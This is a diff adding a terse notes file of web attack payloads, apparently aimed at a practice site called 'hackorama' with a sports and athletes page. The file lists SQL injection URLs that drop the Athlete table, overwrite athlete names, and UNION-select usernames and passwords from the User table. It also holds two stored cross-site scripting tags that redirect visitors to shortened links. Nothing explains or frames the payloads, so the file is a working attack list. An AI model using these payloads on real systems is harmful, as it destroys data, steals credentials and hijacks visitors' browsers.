@@ -1,0 +1,17 @@
+http://exby8t.com/hackorama/_setup.cfm
+
+go to list of athletes, drop
+http://www.exby8t.com/hackorama/sports/?action=athletes&sportid=6;%20drop%20table%20Athlete;
+
+
+UNION SELECT username AS firstname, PASSWORD AS lastname, firstname AS sport, id AS aid, id AS sid FROM User
+
+http://exby8t.com/hackorama/sports/?action=athletes&sportid=1;%20update%20Athlete%20set%20firstName%20=%20'Loserman';
+
+
+
+241543903: 
+<script>location="http://bit.ly/SBXLj4"</script>
+
+danger:
+<script>location="http://bit.ly/X6vDIb"</script>
